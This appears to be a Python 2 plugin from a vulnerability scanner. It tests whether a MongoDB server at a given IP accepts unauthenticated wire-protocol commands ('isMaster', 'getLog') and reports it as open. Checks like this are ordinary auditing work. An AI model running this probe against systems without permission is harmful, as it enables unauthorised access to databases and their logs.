# coding:utf-8
import socket
import binascii
import logging
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "mongodb",
        "info": "mongodb未授权",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def exploit(ip):
    port = PORT
    try:
        socket.setdefaulttimeout(TIME_OUT)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        data = binascii.a2b_hex(
            "3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
        s.send(data)
        result = s.recv(1024)
        if "ismaster" in result:
            getlog_data = binascii.a2b_hex(
                "480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
            s.send(getlog_data)
            result = s.recv(1024)
            if "totalLinesWritten" in result:
                return u"未授权访问"
            return '%s:%s >>>> 存在mongodb未授权访问漏洞'%(ip,port)
    except Exception, e:
        logging.error(ip+' '+str(e))
        pass